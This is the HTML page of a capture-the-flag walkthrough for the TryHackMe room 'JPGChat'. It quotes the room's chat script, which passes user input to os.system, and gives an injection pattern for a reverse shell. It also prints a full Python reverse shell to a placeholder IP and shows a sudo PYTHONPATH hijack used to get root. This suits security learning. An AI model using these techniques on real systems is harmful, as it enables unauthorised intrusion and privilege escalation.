@@ -1,0 +1,425 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Language" content="en">
+
+    <meta name="author" content="d4rkn1gh7 | Balaji Anandhan">
+    <meta name="description" content="Writeup of JPGChat TryHackMe Room">
+    <meta name="keywords" content="blog,ctf,hacking,coding">
+
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="JPGChat TryHackMe Writeup"/>
+<meta name="twitter:description" content="Writeup of JPGChat TryHackMe Room"/>
+
+    <meta property="og:title" content="JPGChat TryHackMe Writeup" />
+<meta property="og:description" content="Writeup of JPGChat TryHackMe Room" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/jpgchat/" />
+<meta property="article:published_time" content="2021-03-01T17:55:12+05:30" />
+<meta property="article:modified_time" content="2021-03-01T17:55:12+05:30" /><meta property="og:see_also" content="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/magician/" /><meta property="og:see_also" content="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/watcher/" /><meta property="og:see_also" content="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/inferno/" /><meta property="og:see_also" content="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/enpass/" /><meta property="og:see_also" content="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/archangel/" />
+
+
+
+    <title>
+  JPGChat TryHackMe Writeup · d4rkn1gh7 | Tech Blog
+</title>
+
+    
+      <link rel="canonical" href="https://d4rkn1gh7.github.io/posts/ctf/tryhackme/jpgchat/">
+    
+
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link href="https://fonts.googleapis.com/css?family=Lato:400,700%7CMerriweather:300,700%7CSource+Code+Pro:400,700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.1.7/css/fork-awesome.min.css"
+      integrity="sha256-gsmEoJAws/Kd3CjuOQzLie5Q3yshhvmo7YNtBG7aaEY=" crossorigin="anonymous">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8/normalize.min.css">
+    
+      
+      
+      <link rel="stylesheet" href="/css/coder.min.f01c647a0d25b40da992a37c3376291185eed8a50ced8c26cc2c0bcfe38c97df.css" integrity="sha256-8Bxkeg0ltA2pkqN8M3YpEYXu2KUM7YwmzCwLz&#43;OMl98=" crossorigin="anonymous" media="screen" />
+    
+
+    
+
+    
+      
+        
+        
+        <link rel="stylesheet" href="/css/coder-dark.min.126ad3988d46bdae6217a11105b53c9662bca05f39d42d3c0fb366919d334620.css" integrity="sha256-EmrTmI1Gva5iF6ERBbU8lmK8oF851C08D7NmkZ0zRiA=" crossorigin="anonymous" media="screen" />
+      
+    
+
+    
+
+    
+
+    <link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
+    <link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
+
+    <link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+    
+      <script defer src="https://twemoji.maxcdn.com/v/13.0.1/twemoji.min.js"
+        integrity="sha384-5f4X0lBluNY/Ib4VhGx0Pf6iDCF99VGXJIyYy7dDLY5QlEd7Ap0hICSSZA1XYbc4" crossorigin="anonymous"></script>
+    
+
+    <meta name="generator" content="Hugo 0.80.0" />
+  </head>
+
+  
+  
+    
+  
+  <body class="colorscheme-auto"
+        onload=" twemoji.parse(document.body); "
+  >
+    
+<div class="float-container">
+    <a id="dark-mode-toggle" class="colorscheme-toggle">
+        <i class="fa fa-adjust fa-fw" aria-hidden="true"></i>
+    </a>
+</div>
+
+
+    <main class="wrapper">
+      <nav class="navigation">
+  <section class="container">
+    <a class="navigation-title" href="/">
+      d4rkn1gh7 | Tech Blog
+    </a>
+    
+      <input type="checkbox" id="menu-toggle" />
+      <label class="menu-button float-right" for="menu-toggle">
+        <i class="fa fa-bars fa-fw" aria-hidden="true"></i>
+      </label>
+      <ul class="navigation-list">
+        
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/posts/">Posts</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/categories/tryhackme">TryHackMe</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/categories/hackthebox">HackTheBox</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/categories/codinglinux">Coding | Linux</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/tags/">Tags</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link" href="/about/">$ whoami</a>
+            </li>
+          
+        
+        
+      </ul>
+    
+  </section>
+</nav>
+
+
+      <div class="content">
+        
+  <section class="container post">
+    <article>
+      <header>
+        <div class="post-title">
+          <h1 class="title">JPGChat TryHackMe Writeup</h1>
+        </div>
+        <div class="post-meta">
+          <div class="date">
+            <span class="posted-on">
+              <i class="fa fa-calendar" aria-hidden="true"></i>
+              <time datetime='2021-03-01T17:55:12&#43;05:30'>
+                March 1, 2021
+              </time>
+            </span>
+            <span class="reading-time">
+              <i class="fa fa-clock-o" aria-hidden="true"></i>
+              3-minute read
+            </span>
+          </div>
+          <div class="authors">
+    <i class="fa fa-user" aria-hidden="true"></i>
+      <a href="/authors/d4rkn1gh7/">d4rkn1gh7</a></div>
+          <div class="categories">
+  <i class="fa fa-folder" aria-hidden="true"></i>
+    <a href="/categories/tryhackme/">TryHackMe</a></div>
+
+          <div class="tags">
+  <i class="fa fa-tag" aria-hidden="true"></i>
+    <a href="/tags/ctf/">ctf</a>
+      <span class="separator">•</span>
+    <a href="/tags/thm/">thm</a>
+      <span class="separator">•</span>
+    <a href="/tags/easy_box/">easy_box</a></div>
+
+        </div>
+      </header>
+
+      <div>
+        
+        <h1 id="jpgchat-tryhackme-writeup">JPGChat TryHackMe Writeup</h1>
+<p><img src="/TryHackMe/JPGChat/BoxImage.png" alt=""></p>
+<h2 id="__first-stage--enumeration__"><strong>First Stage : Enumeration</strong></h2>
+<p>So starting with nmap.</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># Nmap 7.91 scan initiated Mon Mar  1 15:02:16 2021 as: nmap -sC -sV -T4 -vv -p- -oN nmapscan 10.10.250.123
+Nmap scan report for 10.10.250.123
+Host is up, received conn-refused (0.15s latency).
+Scanned at 2021-03-01 15:02:17 IST for 585s
+Not shown: 65533 closed ports
+Reason: 65533 conn-refused
+PORT     STATE SERVICE    REASON  VERSION
+22/tcp   open  ssh        syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 fe:cc:3e:20:3f:a2:f8:09:6f:2c:a3:af:fa:32:9c:94 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDXqRxJhw/1rrvXuEkXF+agfTYMZrCisS01Z9EWAv8j6Cxjd00jBeaTGD/OsyuWUGwIqC0duALIIccwQfG2DjyrJCIPYyXyRiTbTSbqe07wX6qnnxV4xBmKdu8SxVlPKqVN36gQtbHWQqk9M45sej0M3Qz2q5ucrQVgWsjxYflYI1GZg7DSuWbI9/GNJPugt96uxupK0pJiJXNG26sM+w0BdF/DHlWFxG0Z+2CMqSlNt4EA2hlgBWKzGxvKbznJsapdtrAvKxBF6WOfz/FdLMQa7f28UOSs2NnUDrpz8Xhdqz2fj8RiV+gnywm8rkIzT8FOcMTGfsvOHoR8lVFvp5mj
+|   256 e8:18:0c:ad:d0:63:5f:9d:bd:b7:84:b8:ab:7e:d1:97 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBD2CCqg8ac3eDsePDO27TM9OweWbaqytzrMyj+RbwDCHaAmfvhbA0CqTGdTIBAsVG6ect+OlqwgOvmTewS9ihB8=
+|   256 82:1d:6b:ab:2d:04:d5:0b:7a:9b:ee:f4:64:b5:7f:64 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIXcEOgRyLk02uwr8mYrmAmFsUGPSUw1MHEDeH5qmcxv
+3000/tcp open  tcpwrapped syn-ack
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Mon Mar  1 15:12:03 2021 -- 1 IP address (1 host up) scanned in 586.24 seconds
+</code></pre></div><p>Hence we can see the open ports are:</p>
+<ul>
+<li>22</li>
+<li>3000</li>
+</ul>
+<p>So if we visit port 3000.</p>
+<p><img src="/TryHackMe/JPGChat/port.png" alt=""></p>
+<h2 id="__second-stage--initial-foothold__"><strong>Second Stage : Initial Foothold</strong></h2>
+<p>Hence I searched github for <strong>JPGChat</strong>.</p>
+<p><img src="/TryHackMe/JPGChat/gitsearch.png" alt=""></p>
+<p>In that repo I found <strong>jpchat.py</strong> .</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#007f7f">#!/usr/bin/env python3</span>
+
+<span style="color:#fff;font-weight:bold">import</span> os
+
+<span style="color:#fff;font-weight:bold">print</span> (<span style="color:#0ff;font-weight:bold">&#39;Welcome to JPChat&#39;</span>)
+<span style="color:#fff;font-weight:bold">print</span> (<span style="color:#0ff;font-weight:bold">&#39;the source code of this service can be found at our admin</span><span style="color:#0ff;font-weight:bold">\&#39;</span><span style="color:#0ff;font-weight:bold">s github&#39;</span>)
+
+<span style="color:#fff;font-weight:bold">def</span> report_form():
+
+	<span style="color:#fff;font-weight:bold">print</span> (<span style="color:#0ff;font-weight:bold">&#39;this report will be read by Mozzie-jpg&#39;</span>)
+	your_name = <span style="color:#fff;font-weight:bold">input</span>(<span style="color:#0ff;font-weight:bold">&#39;your name:</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#39;</span>)
+	report_text = <span style="color:#fff;font-weight:bold">input</span>(<span style="color:#0ff;font-weight:bold">&#39;your report:</span><span style="color:#0ff;font-weight:bold">\n</span><span style="color:#0ff;font-weight:bold">&#39;</span>)
+	os.system(<span style="color:#0ff;font-weight:bold">&#34;bash -c &#39;echo </span><span style="color:#0ff;font-weight:bold">%s</span><span style="color:#0ff;font-weight:bold"> &gt; /opt/jpchat/logs/report.txt&#39;&#34;</span> % your_name)
+	os.system(<span style="color:#0ff;font-weight:bold">&#34;bash -c &#39;echo </span><span style="color:#0ff;font-weight:bold">%s</span><span style="color:#0ff;font-weight:bold"> &gt;&gt; /opt/jpchat/logs/report.txt&#39;&#34;</span> % report_text)
+
+<span style="color:#fff;font-weight:bold">def</span> chatting_service():
+
+	<span style="color:#fff;font-weight:bold">print</span> (<span style="color:#0ff;font-weight:bold">&#39;MESSAGE USAGE: use [MESSAGE] to message the (currently) only channel&#39;</span>)
+	<span style="color:#fff;font-weight:bold">print</span> (<span style="color:#0ff;font-weight:bold">&#39;REPORT USAGE: use [REPORT] to report someone to the admins (with proof)&#39;</span>)
+	message = <span style="color:#fff;font-weight:bold">input</span>(<span style="color:#0ff;font-weight:bold">&#39;&#39;</span>)
+
+	<span style="color:#fff;font-weight:bold">if</span> message == <span style="color:#0ff;font-weight:bold">&#39;[REPORT]&#39;</span>:
+		report_form()
+	<span style="color:#fff;font-weight:bold">if</span> message == <span style="color:#0ff;font-weight:bold">&#39;[MESSAGE]&#39;</span>:
+		<span style="color:#fff;font-weight:bold">print</span> (<span style="color:#0ff;font-weight:bold">&#39;There are currently 0 other users logged in&#39;</span>)
+		<span style="color:#fff;font-weight:bold">while</span> True:
+			message2 = <span style="color:#fff;font-weight:bold">input</span>(<span style="color:#0ff;font-weight:bold">&#39;[MESSAGE]: &#39;</span>)
+			<span style="color:#fff;font-weight:bold">if</span> message2 == <span style="color:#0ff;font-weight:bold">&#39;[REPORT]&#39;</span>:
+				report_form()
+
+chatting_service()
+</code></pre></div><p>In the report_form method we can see that there is &ldquo;os.system&rdquo; which takes executes a bash command for saving the name and report . In that <strong>%s</strong> is where we will inject our command for reverse shell.</p>
+<p>So inorder to prevent our command being echoed into the text file , we can use</p>
+<blockquote>
+<p>'  payload ; #</p>
+</blockquote>
+<p>the payload is your reverse shell command.</p>
+<p><img src="/TryHackMe/JPGChat/exploit.png" alt=""></p>
+<p><img src="/TryHackMe/JPGChat/usershell.png" alt=""></p>
+<h2 id="__third-stage--user-to-root__"><strong>Third Stage : User to Root</strong></h2>
+<p>So when I tried <strong>sudo -l</strong> I got this.</p>
+<p><img src="/TryHackMe/JPGChat/perms.png" alt=""></p>
+<p>Hence If we open test_module.py we can see the following.</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#007f7f">#!/usr/bin/env python3</span>
+
+<span style="color:#fff;font-weight:bold">from</span> compare <span style="color:#fff;font-weight:bold">import</span> *
+
+<span style="color:#fff;font-weight:bold">print</span>(compare.Str(<span style="color:#0ff;font-weight:bold">&#39;hello&#39;</span>, <span style="color:#0ff;font-weight:bold">&#39;hello&#39;</span>, <span style="color:#0ff;font-weight:bold">&#39;hello&#39;</span>))
+</code></pre></div><p>Hence we need to create a python file called compare.py which will contain our python reverse shell , and then set the python path for the program and we get shell.</p>
+<p>So create a file called <strong>compare.py</strong> in your home directory and paste this python code.</p>
+<div class="highlight"><pre style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#fff;font-weight:bold">import</span> socket,subprocess,os,pty
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect((<span style="color:#0ff;font-weight:bold">&#34;&lt;your-ip&gt;&#34;</span>,<span style="color:#ff0;font-weight:bold">1234</span>))
+os.dup2(s.fileno(),<span style="color:#ff0;font-weight:bold">0</span>)
+os.dup2(s.fileno(),<span style="color:#ff0;font-weight:bold">1</span>)
+os.dup2(s.fileno(),<span style="color:#ff0;font-weight:bold">2</span>)
+pty.spawn(<span style="color:#0ff;font-weight:bold">&#34;/bin/bash&#34;</span>) 
+</code></pre></div><p>And then run this command</p>
+<blockquote>
+<p>sudo PYTHONPATH=/home/wes/ /usr/bin/python3 /opt/development/test_module.py</p>
+</blockquote>
+<p>And we get a shell.</p>
+<p><img src="/TryHackMe/JPGChat/exploit2.png" alt=""></p>
+<p><img src="/TryHackMe/JPGChat/root.png" alt=""></p>
+
+      </div>
+
+
+      <footer>
+        
+
+<section class="see-also">
+  
+    
+    
+    
+      <h3>See also in TryHackMe</h3>
+      <nav>
+        <ul>
+        
+        
+          
+        
+          
+            <li>
+              <a href="/posts/ctf/tryhackme/magician/">Magician TryHackMe Writeup</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/posts/ctf/tryhackme/watcher/">Watcher TryHackMe Writeup</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/posts/ctf/tryhackme/inferno/">Inferno TryHackMe Writeup</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/posts/ctf/tryhackme/enpass/">Enpass TryHackMe Writeup</a>
+            </li>
+          
+        
+          
+            <li>
+              <a href="/posts/ctf/tryhackme/archangel/">Archangel TryHackMe Writeup</a>
+            </li>
+          
+        
+        </ul>
+      </nav>
+    
+  
+</section>
+
+
+        <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "yourdiscussshortname" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+      </div>
+
+      
+  <footer class="footer">
+    <section class="container">
+      
+        <p>Hack The Planet!</p>
+      
+      
+        ©
+        
+          2019 -
+        
+        2021
+         d4rkn1gh7 | Balaji Anandhan 
+      
+      
+      
+        
+      
+    </section>
+  </footer>
+
+
+    </main>
+
+    
+      
+        
+        <script src="/js/dark-mode.min.0213e1773e6d1c5a644f847c67a6f8abac49a3776e2976f6008038af8c5b76a1.js"></script>
+      
+    
+
+    
+
+    
+
+    <script>
+(function(f, a, t, h, o, m){
+	a[h]=a[h]||function(){
+		(a[h].q=a[h].q||[]).push(arguments)
+	};
+	o=f.createElement('script'),
+	m=f.getElementsByTagName('script')[0];
+	o.async=1; o.src=t; o.id='fathom-script';
+	m.parentNode.insertBefore(o,m)
+})(document, window, '//analytics.example.com/tracker.js', 'fathom');
+fathom('set', 'siteId', 'ABCDE');
+fathom('trackPageview');
+</script>
+
+
+    <script async defer data-domain="example.com" src="https://analytics.example.com/js/plausible.js"></script>
+
+
+    <script data-goatcounter="https://code.goatcounter.com/count"
+        async src="//gc.zgo.at/count.js"></script>
+
+
+    
+<script defer src='https://static.cloudflareinsights.com/beacon.min.js'
+        data-cf-beacon='{"token": "token"}'></script>
+
+
+  </body>
+
+</html>
